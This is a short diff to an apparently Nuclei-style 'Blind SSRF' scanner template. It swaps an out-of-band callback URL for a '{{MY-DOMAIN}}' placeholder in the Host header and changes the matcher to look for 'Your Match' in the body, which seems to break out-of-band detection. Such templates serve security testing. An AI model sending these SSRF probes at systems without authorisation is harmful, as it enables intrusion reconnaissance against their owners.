@@ -2,15 +2,14 @@ id: 0x012
 
 info:
   name: Blind SSRF
-  author: reewardius
-  severity: high
-  tags: ssrf
+  author: 0xAwali
+  severity: info
 
-http:
+requests:
   - raw:
       - |
         GET / HTTP/1.1
-        Host: {{Host}}.{{Port}}.BSSRF-012.{{interactsh-url}}
+        Host: {{Host}}.{{Port}}.BSSRF-012.{{MY-DOMAIN}}
         X-Forwarded-Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Cache-Control: no-transform
@@ -19,8 +18,6 @@ http:
 
     matchers:
       - type: word
-        part: interactsh_protocol
+        part: body
         words:
-          - "dns"
-          - "http"
-        condition: or
+          - "Your Match"
